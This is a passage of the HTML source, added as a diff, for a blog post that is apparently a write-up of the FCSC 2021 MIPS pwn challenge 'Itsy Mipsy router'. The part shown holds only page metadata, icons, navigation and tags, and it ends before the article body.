@@ -1,0 +1,1460 @@
+<!DOCTYPE html>
+<html
+  itemscope
+  itemtype="http://schema.org/WebPage"
+  lang="en"
+  class="color-toggle-hidden"
+>
+  <head>
+    <meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+
+
+
+
+
+  <meta name="description" content="Itsy Mipsy Router (200 pts)     Itsy Mipsy Router is a pwn challenge I did during the FCSC event. It&rsquo;s not a very hard challenge but I found it very interesting because it was my first mips pwn challenge !
+Setup     So basically we got this:
+ On vous demander d&rsquo;auditer un routeur à l&rsquo;interface entre Internet et un réseau interne d&rsquo;une entreprise. Le client vous demande si il est possible de lire les fichiers stockés sur la machine filer qui sert de serveur de fichiers HTTP." />
+
+
+  <meta name="keywords" content="pwn,binary exploitation,cryptography,Reverse engineering,hypervisor" />
+
+
+  
+  
+    
+      
+      
+    
+  
+
+  
+    <meta name="author" content="nasm" />
+  
+
+
+    <title>
+      
+        [FCSC 2021 - pwn] Itsy Mipsy router | 
+      repr
+    </title>
+
+    <link rel="icon" type="image/svg+xml" href="/favicon/favicon.svg" />
+<link
+  rel="icon"
+  type="image/png"
+  sizes="48x48"
+  href="/favicon/favicon-32x32.png"
+/>
+<link
+  rel="icon"
+  type="image/png"
+  sizes="32x32"
+  href="/favicon/favicon-32x32.png"
+/>
+<link
+  rel="icon"
+  type="image/png"
+  sizes="16x16"
+  href="/favicon/favicon-16x16.png"
+/>
+
+    
+
+    <meta property="og:title" content="[FCSC 2021 - pwn] Itsy Mipsy router" />
+<meta
+  property="og:description"
+  content="
+    
+      Itsy Mipsy Router (200 pts)     Itsy Mipsy Router is a pwn challenge I did during the FCSC event. It&rsquo;s not a very hard challenge but I found it very interesting because it was my first mips pwn challenge !
+Setup     So basically we got this:
+ On vous demander d&rsquo;auditer un routeur à l&rsquo;interface entre Internet et un réseau interne d&rsquo;une entreprise. Le client vous demande si il est possible de lire les fichiers stockés sur la machine filer qui sert de serveur de fichiers HTTP.
+    
+  "
+/>
+<meta property="og:type" content="article" />
+<meta property="og:url" content="http://n4sm.github.io/posts/mipsy/" />
+      <meta property="og:image" content="http://n4sm.github.io/risa.png" />
+    <meta property="article:section" content="posts" />
+  
+    <meta
+      property="article:published_time"
+      content="2021-05-03T00:00:00+00:00"
+    />
+  
+  
+    <meta
+      property="article:modified_time"
+      content="2021-05-03T00:00:00+00:00"
+    />
+  
+
+<meta name="twitter:card" content="summary_large_image" />
+      <meta name="twitter:image" content="http://n4sm.github.io/risa.png" />
+    
+<meta name="twitter:title" content="[FCSC 2021 - pwn] Itsy Mipsy router" />
+<meta
+  name="twitter:description"
+  content="
+    
+      Itsy Mipsy Router (200 pts)     Itsy Mipsy Router is a pwn challenge I did during the FCSC event. It&rsquo;s not a very hard challenge but I found it very interesting because it was my first mips pwn challenge !
+Setup     So basically we got this:
+ On vous demander d&rsquo;auditer un routeur à l&rsquo;interface entre Internet et un réseau interne d&rsquo;une entreprise. Le client vous demande si il est possible de lire les fichiers stockés sur la machine filer qui sert de serveur de fichiers HTTP.
+    
+  "
+/>
+
+
+    <script src="/js/main-b22ac364.bundle.min.js"></script>
+
+<link
+  rel="preload"
+  as="font"
+  href="/fonts/Metropolis.woff2"
+  type="font/woff2"
+  crossorigin="anonymous"
+/>
+<link
+  rel="preload"
+  as="font"
+  href="/fonts/LiberationSans.woff2"
+  type="font/woff2"
+  crossorigin="anonymous"
+/>
+<link
+  rel="preload"
+  as="font"
+  href="/fonts/GeekblogIcons.woff2"
+  type="font/woff2"
+  crossorigin="anonymous"
+/>
+
+<link
+  rel="preload"
+  href="/main-2857a4bc.min.css"
+  as="style"
+/>
+<link
+  rel="stylesheet"
+  href="/main-2857a4bc.min.css"
+  media="all"
+/>
+
+<link
+  rel="preload"
+  href="/mobile-3888ed2b.min.css"
+  as="style"
+/>
+<link
+  rel="stylesheet"
+  href="/mobile-3888ed2b.min.css"
+  media="screen and (max-width: 45rem)"
+/>
+
+<link
+  rel="preload"
+  href="/print-8a905a2e.min.css"
+  as="style"
+/>
+<link
+  rel="stylesheet"
+  href="/print-8a905a2e.min.css"
+  media="print"
+/>
+
+<link
+  rel="preload"
+  href="/custom.css"
+  as="style"
+/>
+<link
+  rel="stylesheet"
+  href="/custom.css"
+  media="all"
+/>
+
+
+
+
+
+<!-- Made with Geekblog theme https://github.com/thegeeklab/hugo-geekblog -->
+
+    
+
+
+
+
+<script type="application/ld+json">
+{
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "articleSection": "posts",
+    "name": "[FCSC 2021 - pwn] Itsy Mipsy router",
+    "headline": "[FCSC 2021 - pwn] Itsy Mipsy router",
+    "alternativeHeadline": "",
+    "description": "Itsy Mipsy Router (200 pts)     Itsy Mipsy Router is a pwn challenge I did during the FCSC event. It\u0026rsquo;s not a very hard challenge but I found it very interesting because it was my first mips pwn challenge !\nSetup     So basically we got this:\n On vous demander d\u0026rsquo;auditer un routeur à l\u0026rsquo;interface entre Internet et un réseau interne d\u0026rsquo;une entreprise. Le client vous demande si il est possible de lire les fichiers stockés sur la machine filer qui sert de serveur de fichiers HTTP.",
+    "inLanguage": "en",
+    "isFamilyFriendly": "true",
+    "mainEntityOfPage": {
+        "@type": "WebPage",
+        "@id": "http:\/\/n4sm.github.io\/posts\/mipsy\/"
+    },
+    "author" : [
+        {
+            "@type": "Person",
+            "name": "nasm"
+        }
+    ],
+    "copyrightHolder" : "repr",
+    "copyrightYear" : "2021",
+    "dateCreated": "2021-05-03T00:00:00.00Z",
+    "datePublished": "2021-05-03T00:00:00.00Z",
+    "dateModified": "2021-05-03T00:00:00.00Z",
+    "publisher":{
+        "@type":"Organization",
+        "name": "repr",
+        "url": "http://n4sm.github.io",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "http:\/\/n4sm.github.io\/maths.png",
+            "width":"32",
+            "height":"32"
+        }
+    },
+    "url" : "http:\/\/n4sm.github.io\/posts\/mipsy\/",
+    "wordCount" : "3856",
+    "genre" : [ "ctf" , "ret2school" , "FCSC" , "mipsy" , "n4sm" , "nasm" , "2021" , "mips" , "pwn" ]
+}
+</script>
+
+
+    
+
+  </head>
+
+  <body>
+    
+  <!-- geekblog include: sprites/geekblog.svg -->
+  <svg class="svg-sprite" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink"><defs><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_arrow_back" xmlns="http://www.w3.org/2000/svg"><path d="M31.999 14.035v3.93H7.673l11.134 11.228L16 32 .001 16.001 16 .002l2.807 2.807L7.673 14.037h24.326z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_arrow_left" xmlns="http://www.w3.org/2000/svg"><path d="M7.954 17.965v5.988L.001 16l7.953-7.953v5.988H32v3.93H7.954z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_arrow_right" xmlns="http://www.w3.org/2000/svg"><path d="M24.046 14.035V8.047L31.999 16l-7.953 7.953v-5.988H0v-3.93h24.046z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_bitbucket" xmlns="http://www.w3.org/2000/svg"><path d="M15.905 13.355c.189 1.444-1.564 2.578-2.784 1.839-1.375-.602-1.375-2.784-.034-3.403 1.151-.705 2.818.223 2.818 1.564zm1.907-.361c-.309-2.44-3.076-4.056-5.328-3.042-1.426.636-2.389 2.148-2.32 3.747.086 2.097 2.08 3.815 4.176 3.626s3.729-2.234 3.472-4.331zm4.108-9.315c-.756-.997-2.045-1.169-3.179-1.358-3.214-.516-6.513-.533-9.727.034-1.066.172-2.269.361-2.939 1.323 1.1 1.031 2.664 1.186 4.073 1.358 2.544.327 5.156.344 7.699.017 1.426-.172 3.008-.309 4.073-1.375zm.979 17.788c-.481 1.684-.206 3.953-1.994 4.932-3.076 1.701-6.806 1.89-10.191 1.289-1.787-.327-3.884-.894-4.864-2.578-.43-1.65-.705-3.334-.98-5.018l.103-.275.309-.155c5.121 3.386 12.288 3.386 17.427 0 .808.241.206 1.22.189 1.805zM26.01 4.951c-.584 3.764-1.255 7.51-1.908 11.257-.189 1.1-1.255 1.719-2.148 2.183-3.214 1.615-6.96 1.89-10.483 1.512-2.389-.258-4.829-.894-6.771-2.389-.911-.705-.911-1.908-1.083-2.922-.602-3.523-1.289-7.046-1.719-10.604.206-1.547 1.942-2.217 3.231-2.698C6.848.654 8.686.362 10.508.19c3.884-.378 7.854-.241 11.618.859 1.341.395 2.784.945 3.695 2.097.412.533.275 1.203.189 1.805z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_bookmark" xmlns="http://www.w3.org/2000/svg"><path d="M20.357 5.856q1.157 0 2.043.851t.885 2.008v23.284l-10.212-4.357-10.144 4.357V8.715q0-1.157.885-2.008t2.042-.851h14.502zm5.787 18.859V5.856q0-1.157-.851-2.042t-2.008-.885H8.715q0-1.157.885-2.042t2.043-.885h14.502q1.157 0 2.043.885t.885 2.042v23.216z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_brightness_auto" xmlns="http://www.w3.org/2000/svg"><path d="M16.846 18.938h2.382L15.22 7.785h-2.44L8.772 18.938h2.382l.871-2.44h3.95zm7.087-9.062L27.999 14l-4.066 4.124v5.809h-5.809L14 27.999l-4.124-4.066H4.067v-5.809L.001 14l4.066-4.124V4.067h5.809L14 .001l4.124 4.066h5.809v5.809zm-11.385 4.937L14 10.282l1.452 4.531h-2.904z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_brightness_dark" xmlns="http://www.w3.org/2000/svg"><path d="M14 21.435q3.079 0 5.257-2.178T21.435 14t-2.178-5.257T14 6.565q-1.51 0-3.079.697 1.917.871 3.108 2.701T15.22 14t-1.191 4.037-3.108 2.701q1.568.697 3.079.697zm9.933-11.559L27.999 14l-4.066 4.124v5.809h-5.809L14 27.999l-4.124-4.066H4.067v-5.809L.001 14l4.066-4.124V4.067h5.809L14 .001l4.124 4.066h5.809v5.809z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_brightness_light" xmlns="http://www.w3.org/2000/svg"><path d="M14 21.435q3.079 0 5.257-2.178T21.435 14t-2.178-5.257T14 6.565 8.743 8.743 6.565 14t2.178 5.257T14 21.435zm9.933-3.311v5.809h-5.809L14 27.999l-4.124-4.066H4.067v-5.809L.001 14l4.066-4.124V4.067h5.809L14 .001l4.124 4.066h5.809v5.809L27.999 14z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_check" xmlns="http://www.w3.org/2000/svg"><path d="M8.885 20.197L25.759 3.323l2.24 2.24L8.885 24.677 0 15.792l2.24-2.24z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_clear" xmlns="http://www.w3.org/2000/svg"><path d="M32 3.222L19.222 16 32 28.778l-3.221 3.221-12.778-12.778L3.223 31.999.002 28.778 12.78 16 .002 3.222 3.223.001l12.778 12.778L28.779.001z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_cloud_off" xmlns="http://www.w3.org/2000/svg"><path d="M9.023 10.5H7q-1.914 0-3.281 1.395t-1.367 3.309 1.367 3.281T7 19.852h11.375zM3.5 4.976l1.477-1.477L24.5 23.022l-1.477 1.477-2.352-2.297H6.999q-2.898 0-4.949-2.051t-2.051-4.949q0-2.844 1.969-4.867t4.758-2.133zm19.086 5.578q2.242.164 3.828 1.832T28 16.351q0 3.008-2.461 4.758l-1.695-1.695q1.805-.984 1.805-3.063 0-1.422-1.039-2.461t-2.461-1.039h-1.75v-.602q0-2.68-1.859-4.539t-4.539-1.859q-1.531 0-2.953.711l-1.75-1.695Q11.431 3.5 14.001 3.5q2.953 0 5.496 2.078t3.09 4.977z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_code" xmlns="http://www.w3.org/2000/svg"><path d="M9.917 24.5a1.75 1.75 0 10-3.501.001 1.75 1.75 0 003.501-.001zm0-21a1.75 1.75 0 10-3.501.001A1.75 1.75 0 009.917 3.5zm11.666 2.333a1.75 1.75 0 10-3.501.001 1.75 1.75 0 003.501-.001zm1.75 0a3.502 3.502 0 01-1.75 3.026c-.055 6.581-4.721 8.039-7.82 9.023-2.898.911-3.846 1.349-3.846 3.117v.474a3.502 3.502 0 011.75 3.026c0 1.932-1.568 3.5-3.5 3.5s-3.5-1.568-3.5-3.5c0-1.294.711-2.424 1.75-3.026V6.526A3.502 3.502 0 014.667 3.5c0-1.932 1.568-3.5 3.5-3.5s3.5 1.568 3.5 3.5a3.502 3.502 0 01-1.75 3.026v9.06c.93-.456 1.914-.766 2.807-1.039 3.391-1.075 5.323-1.878 5.359-5.687a3.502 3.502 0 01-1.75-3.026c0-1.932 1.568-3.5 3.5-3.5s3.5 1.568 3.5 3.5z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_contacts" xmlns="http://www.w3.org/2000/svg"><path d="M22.688 22.688v-2q0-1.5-2.281-2.438t-4.406-.938-4.406.938-2.281 2.438v2h13.375zM16 9q-1.25 0-2.125.875T13 12t.875 2.125T16 15t2.125-.875T19 12t-.875-2.125T16 9zm10.688-3.687q1.063 0 1.844.813t.781 1.875v16q0 1.063-.781 1.875t-1.844.813H5.313q-1.063 0-1.844-.813t-.781-1.875v-16q0-1.063.781-1.875t1.844-.813h21.375zM5.313 32v-2.688h21.375V32H5.313zM26.688 0v2.688H5.313V0h21.375z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_copy" xmlns="http://www.w3.org/2000/svg"><path d="M23.502 25.438V7.626H9.562v17.812h13.94zm0-20.315q1.013 0 1.787.745t.774 1.757v17.812q0 1.013-.774 1.787t-1.787.774H9.562q-1.013 0-1.787-.774t-.774-1.787V7.625q0-1.013.774-1.757t1.787-.745h13.94zM19.689 0v2.562H4.438v17.812H1.936V2.562q0-1.013.745-1.787T4.438.001h15.251z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_create" xmlns="http://www.w3.org/2000/svg"><path d="M31.499 7.167l-3.25 3.25-6.666-6.666 3.25-3.25q.5-.5 1.25-.5t1.25.5l4.166 4.166q.5.5.5 1.25t-.5 1.25zM.001 25.333L19.667 5.667l6.666 6.666L6.667 31.999H.001v-6.666z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_date" xmlns="http://www.w3.org/2000/svg"><path d="M27.192 28.844V11.192H4.808v17.652h22.384zm0-25.689q1.277 0 2.253.976t.976 2.253v22.459q0 1.277-.976 2.216t-2.253.939H4.808q-1.352 0-2.291-.901t-.939-2.253V6.385q0-1.277.939-2.253t2.291-.976h1.577V.001h3.23v3.155h12.769V.001h3.23v3.155h1.577zm-3.155 11.267v3.155h-3.23v-3.155h3.23zm-6.46 0v3.155h-3.155v-3.155h3.155zm-6.384 0v3.155h-3.23v-3.155h3.23z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_download" xmlns="http://www.w3.org/2000/svg"><path d="M2.866 28.209h26.269v3.79H2.866v-3.79zm26.268-16.925L16 24.418 2.866 11.284h7.493V.001h11.283v11.283h7.493z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_email" xmlns="http://www.w3.org/2000/svg"><path d="M28.845 9.615v-3.23L16 14.422 3.155 6.385v3.23L16 17.577zm0-6.46q1.277 0 2.216.977T32 6.385v19.23q0 1.277-.939 2.253t-2.216.977H3.155q-1.277 0-2.216-.977T0 25.615V6.385q0-1.277.939-2.253t2.216-.977h25.69z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_git" xmlns="http://www.w3.org/2000/svg"><path d="M27.472 12.753L15.247.529a1.803 1.803 0 00-2.55 0l-2.84 2.84 2.137 2.137a2.625 2.625 0 013.501 3.501l3.499 3.499a2.625 2.625 0 11-1.237 1.237l-3.499-3.499c-.083.04-.169.075-.257.106v7.3a2.626 2.626 0 11-1.75 0v-7.3a2.626 2.626 0 01-1.494-3.607L8.62 4.606l-8.09 8.09a1.805 1.805 0 000 2.551l12.225 12.224a1.803 1.803 0 002.55 0l12.168-12.168a1.805 1.805 0 000-2.551z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_github" xmlns="http://www.w3.org/2000/svg"><path d="M16 .394c8.833 0 15.999 7.166 15.999 15.999 0 7.062-4.583 13.062-10.937 15.187-.813.146-1.104-.354-1.104-.771 0-.521.021-2.25.021-4.396 0-1.5-.5-2.458-1.083-2.958 3.562-.396 7.312-1.75 7.312-7.896 0-1.75-.625-3.167-1.646-4.291.167-.417.708-2.042-.167-4.25-1.333-.417-4.396 1.646-4.396 1.646a15.032 15.032 0 00-8 0S8.937 6.602 7.603 7.018c-.875 2.208-.333 3.833-.167 4.25-1.021 1.125-1.646 2.542-1.646 4.291 0 6.125 3.729 7.5 7.291 7.896-.458.417-.875 1.125-1.021 2.146-.917.417-3.25 1.125-4.646-1.333-.875-1.521-2.458-1.646-2.458-1.646-1.562-.021-.104.979-.104.979 1.042.479 1.771 2.333 1.771 2.333.938 2.854 5.396 1.896 5.396 1.896 0 1.333.021 2.583.021 2.979 0 .417-.292.917-1.104.771C4.582 29.455-.001 23.455-.001 16.393-.001 7.56 7.165.394 15.998.394zM6.063 23.372c.042-.083-.021-.187-.146-.25-.125-.042-.229-.021-.271.042-.042.083.021.187.146.25.104.062.229.042.271-.042zm.646.709c.083-.062.062-.208-.042-.333-.104-.104-.25-.146-.333-.062-.083.062-.062.208.042.333.104.104.25.146.333.062zm.625.937c.104-.083.104-.25 0-.396-.083-.146-.25-.208-.354-.125-.104.062-.104.229 0 .375s.271.208.354.146zm.875.875c.083-.083.042-.271-.083-.396-.146-.146-.333-.167-.417-.062-.104.083-.062.271.083.396.146.146.333.167.417.062zm1.187.521c.042-.125-.083-.271-.271-.333-.167-.042-.354.021-.396.146s.083.271.271.312c.167.062.354 0 .396-.125zm1.313.104c0-.146-.167-.25-.354-.229-.187 0-.333.104-.333.229 0 .146.146.25.354.229.187 0 .333-.104.333-.229zm1.208-.208c-.021-.125-.187-.208-.375-.187-.187.042-.312.167-.292.312.021.125.187.208.375.167s.312-.167.292-.292z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_gitlab" xmlns="http://www.w3.org/2000/svg"><path d="M1.629 11.034L14 26.888.442 17.048a1.09 1.09 0 01-.39-1.203l1.578-4.811zm7.217 0h10.309l-5.154 15.854zM5.753 1.475l3.093 9.559H1.63l3.093-9.559a.548.548 0 011.031 0zm20.618 9.559l1.578 4.811c.141.437-.016.922-.39 1.203l-13.558 9.84 12.371-15.854zm0 0h-7.216l3.093-9.559a.548.548 0 011.031 0z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_heart" xmlns="http://www.w3.org/2000/svg"><path d="M16 29.714a1.11 1.11 0 01-.786-.321L4.072 18.643c-.143-.125-4.071-3.714-4.071-8 0-5.232 3.196-8.357 8.535-8.357 3.125 0 6.053 2.464 7.464 3.857 1.411-1.393 4.339-3.857 7.464-3.857 5.339 0 8.535 3.125 8.535 8.357 0 4.286-3.928 7.875-4.089 8.035L16.785 29.392c-.214.214-.5.321-.786.321z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_keyboard_arrow_left" xmlns="http://www.w3.org/2000/svg"><path d="M25.875 28.25L22.125 32 6.126 16.001 22.125.002l3.75 3.75-12.25 12.25z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_keyboard_arrow_right" xmlns="http://www.w3.org/2000/svg"><path d="M6.125 28.25L18.375 16 6.125 3.75 9.875 0l15.999 15.999L9.875 31.998z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_keyborad_arrow_down" xmlns="http://www.w3.org/2000/svg"><path d="M3.281 5.36L14 16.079 24.719 5.36 28 8.641l-14 14-14-14z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_keyborad_arrow_up" xmlns="http://www.w3.org/2000/svg"><path d="M24.719 22.64L14 11.921 3.281 22.64 0 19.359l14-14 14 14z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_link" xmlns="http://www.w3.org/2000/svg"><path d="M24.037 7.963q3.305 0 5.634 2.366T32 16t-2.329 5.671-5.634 2.366h-6.46v-3.08h6.46q2.028 0 3.493-1.465t1.465-3.493-1.465-3.493-3.493-1.465h-6.46v-3.08h6.46zM9.615 17.578v-3.155h12.77v3.155H9.615zM3.005 16q0 2.028 1.465 3.493t3.493 1.465h6.46v3.08h-6.46q-3.305 0-5.634-2.366T0 16.001t2.329-5.671 5.634-2.366h6.46v3.08h-6.46q-2.028 0-3.493 1.465t-1.465 3.493z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_menu" xmlns="http://www.w3.org/2000/svg"><path d="M.001 5.334h31.998v3.583H.001V5.334zm0 12.416v-3.5h31.998v3.5H.001zm0 8.916v-3.583h31.998v3.583H.001z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_notifications" xmlns="http://www.w3.org/2000/svg"><path d="M25.846 22.154l3.308 3.308v1.615H2.847v-1.615l3.308-3.308V14q0-3.846 1.961-6.692t5.423-3.692V2.462q0-1 .692-1.731T16 0t1.769.731.692 1.731v1.154q3.461.846 5.423 3.692T25.846 14v8.154zM16 32q-1.385 0-2.346-.923t-.962-2.308h6.615q0 1.308-1 2.269T15.999 32z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_person" xmlns="http://www.w3.org/2000/svg"><path d="M16 20.023q5.052 0 10.526 2.199t5.473 5.754v4.023H0v-4.023q0-3.555 5.473-5.754t10.526-2.199zM16 16q-3.275 0-5.614-2.339T8.047 8.047t2.339-5.661T16 0t5.614 2.386 2.339 5.661-2.339 5.614T16 16z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_pin" xmlns="http://www.w3.org/2000/svg"><path d="M17.6 19.2h9.6v-1.6L22.4 16V3.2l4.8-1.6V0H4.8v1.6l4.8 1.6V16l-4.8 1.6v1.6h9.6v11.2L16 32l1.6-1.6V19.2z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_rss_feed" xmlns="http://www.w3.org/2000/svg"><path d="M-.481 12.048q8.482 0 14.457 5.976t5.976 14.457h-5.879q0-5.976-4.289-10.264T-.48 17.928v-5.879zm0-11.565q13.204 0 22.601 9.397t9.397 22.601h-5.783q0-10.891-7.662-18.553T-.481 6.266V.483zm0 27.468q0-1.831 1.301-3.132t3.229-1.301 3.181 1.253 1.253 3.181-1.301 3.229-3.132 1.301q-1.928 0-3.229-1.301T-.48 27.952z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_search" xmlns="http://www.w3.org/2000/svg"><path d="M11.925 20.161q3.432 0 5.834-2.402t2.402-5.834-2.402-5.834-5.834-2.402-5.834 2.402-2.402 5.834 2.402 5.834 5.834 2.402zm10.981 0L32 29.255 29.255 32l-9.094-9.094v-1.458l-.515-.515q-3.26 2.831-7.721 2.831-4.976 0-8.45-3.432T.001 11.925t3.474-8.45 8.45-3.474 8.407 3.474 3.432 8.45q0 1.802-.858 4.075t-1.973 3.646l.515.515h1.458z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_security" xmlns="http://www.w3.org/2000/svg"><path d="M16 0l13.072 5.855v8.715q0 6.059-3.745 11.063T16 31.999q-5.583-1.362-9.327-6.366T2.928 14.57V5.855zm0 16v13.004q4.017-1.294 6.808-4.868T26.144 16H16zm0 0V3.2L5.856 7.693v8.306H16z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_star" xmlns="http://www.w3.org/2000/svg"><path d="M14 22.052L5.324 27.31l2.3-9.859L0 10.813l10.056-.854L14 .692l3.944 9.267L28 10.813l-7.624 6.638 2.3 9.859z"/></svg><svg viewBox="-7.27 -7.27 42.55 42.55" id="gblog_tag" xmlns="http://www.w3.org/2000/svg"><path d="M17.52 17.52v-7.041h-7.041v7.041h7.041zM28 10.479h-7.041v7.041H28v3.439h-7.041V28H17.52v-7.041h-7.041V28H7.04v-7.041H-.001V17.52H7.04v-7.041H-.001V7.04H7.04V-.001h3.439V7.04h7.041V-.001h3.439V7.04H28v3.439z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_timer" xmlns="http://www.w3.org/2000/svg"><path d="M16 29q4.428 0 7.536-3.143t3.107-7.571-3.107-7.536T16 7.643 8.464 10.75t-3.107 7.536 3.107 7.571T16 29zM26.714 9.786q1.214 1.571 2.107 4.036t.893 4.464q0 5.643-4 9.678T16 32t-9.714-4.036-4-9.678 4-9.678T16 4.572q1.929 0 4.464.929t4.107 2.143l2.143-2.214q1.143.929 2.143 2.143zM14.5 19.857v-9.143h3v9.143h-3zM20.571.001v3.071h-9.143V.001h9.143z"/></svg><svg viewBox="-7.27 -7.27 46.55 46.55" id="gblog_tree" xmlns="http://www.w3.org/2000/svg"><path d="M32 14.423H20.808V9.616h-3.23v12.77h3.23v-4.807H32v12.845H20.808v-4.807h-6.385v-16h-3.23v4.807H.001V1.579h11.192v4.807h9.615V1.579H32v12.845z"/></svg></defs></svg>
+
+
+
+
+    <div
+      class="wrapper dark-mode-dim"
+    >
+      <header class="gblog-header">
+  <div class="container flex flex-wrap">
+    <div class="gblog-header__col-1 flex justify-start hidden-mobile"></div>
+    <div class="gblog-header__col-2 flex align-center justify-center ">
+      <a class="gblog-header__link" rel="me" href="http://n4sm.github.io">
+        <span class="gblog-brand flex align-center justify-center">
+          <img
+            class="gblog-brand__img"
+            src="/maths.png"
+            alt=""
+          />
+          <span class="gblog-brand__title">repr</span>
+        </span>
+        
+          <span class="gblog-brand__subtitle flex align-center justify-center">pwn, RE, crypto stuff</span>
+        
+      </a>
+    </div>
+    <div class="gblog-header__col-3 flex justify-end">
+      <span id="gblog-dark-mode">
+        <svg class="icon gblog_brightness_dark">
+          <title></title>
+          <use xlink:href="#gblog_brightness_dark"></use>
+        </svg>
+        <svg class="icon gblog_brightness_light">
+          <title></title>
+          <use xlink:href="#gblog_brightness_light"></use>
+        </svg>
+        <svg class="icon gblog_brightness_auto">
+          <title></title>
+          <use xlink:href="#gblog_brightness_auto"></use>
+        </svg>
+      </span>
+    </div>
+  </div>
+</header>
+<nav class="gblog-nav">
+  <input type="checkbox" id="menu-control" class="hidden" />
+  <div class="gblog-nav__control">
+    <label for="menu-control" class="flex align-center justify-center">
+      <svg class="icon gblog_menu"><use xlink:href="#gblog_menu"></use></svg>
+      <svg class="icon gblog_clear"><use xlink:href="#gblog_clear"></use></svg>
+      <span>Navigation</span>
+    </label>
+  </div>
+  <ul class="gblog-nav__list container flex flex-wrap justify-center menu-content">
+    
+    
+    
+      
+
+  
+  
+  
+
+  
+    
+      
+      
+      
+
+      
+        <li>
+          <a
+            href="
+              https://github.com/n4sm
+            "
+            class="gblog-nav__entry "
+          >
+            
+              <svg class="icon gblog_github"><use xlink:href="#gblog_github"></use></svg>
+            
+            Github Profile
+          </a>
+        </li>
+      
+    
+  
+    
+      
+      
+      
+
+      
+        <li>
+          <a
+            href="
+              /posts/about
+            "
+            class="gblog-nav__entry "
+          >
+            
+              <svg class="icon gblog_person"><use xlink:href="#gblog_person"></use></svg>
+            
+            About
+          </a>
+        </li>
+      
+    
+  
+
+
+
+
+
+
+    
+  </ul>
+</nav>
+
+
+
+      <main class="gblog-page container">
+        
+  <article class="gblog-post">
+    <header class="gblog-post__header">
+      
+      
+
+
+      <h1 class="gblog-post__title">[FCSC 2021 - pwn] Itsy Mipsy router</h1>
+
+      
+        <div class="flex flex-wrap align-center gblog-post__meta gblog-post__meta--head">
+          <span class="flex align-center no-wrap">
+  <svg class="icon gblog_date"><use xlink:href="#gblog_date"></use></svg>
+  <span class="gblog-post__tag">
+    <time datetime="2021-05-03T00:00:00Z">
+      
+      May 3, 2021
+    </time>
+  </span>
+</span>
+
+<span class="flex align-center no-wrap">
+  <svg class="icon gblog_timer"><use xlink:href="#gblog_timer"></use></svg>
+  <span class="gblog-post__tag">19 min read</span>
+</span>
+
+
+
+
+
+
+
+
+  
+    
+    
+      
+        <span class="flex align-center no-wrap">
+          <svg class="icon gblog_bookmark"><use xlink:href="#gblog_bookmark"></use></svg>
+          
+  <span class="gblog-post__tag gblog-button gblog-button--regular">
+    <a
+      class="gblog-button__link"
+      href="/tags/ctf/"
+      title="All posts tagged with 'ctf'"
+    >
+      ctf
+    </a>
+  </span>
+
+        </span>
+      
+    
+    
+  
+    
+    
+      
+        
+  <span class="gblog-post__tag gblog-button gblog-button--regular">
+    <a
+      class="gblog-button__link"
+      href="/tags/FCSC/"
+      title="All posts tagged with 'FCSC'"
+    >
+      FCSC
+    </a>
+  </span>
+
+      
+    
+    
+  
+    
+    
+      
+        
+  <span class="gblog-post__tag gblog-button gblog-button--regular">
+    <a
+      class="gblog-button__link"
+      href="/tags/mips/"
+      title="All posts tagged with 'mips'"
+    >
+      mips
+    </a>
+  </span>
+
+      
+    
+    
+  
+    
+    
+      
+        
+  <span class="gblog-post__tag gblog-button gblog-button--regular">
+    <a
+      class="gblog-button__link"
+      href="/tags/mipsy/"
+      title="All posts tagged with 'mipsy'"
+    >
+      mipsy
+    </a>
+  </span>
+
+      
+    
+    
+  
+    
+    
+      
+        
+  <span class="gblog-post__tag gblog-button gblog-button--regular">
+    <a
+      class="gblog-button__link"
+      href="/tags/n4sm/"
+      title="All posts tagged with 'n4sm'"
+    >
+      n4sm
+    </a>
+  </span>
+
+      
+    
+    
+  
+    
+    
+      
+        
+  <span class="gblog-post__tag gblog-button gblog-button--regular">
+    <a
+      class="gblog-button__link"
+      href="/tags/nasm/"
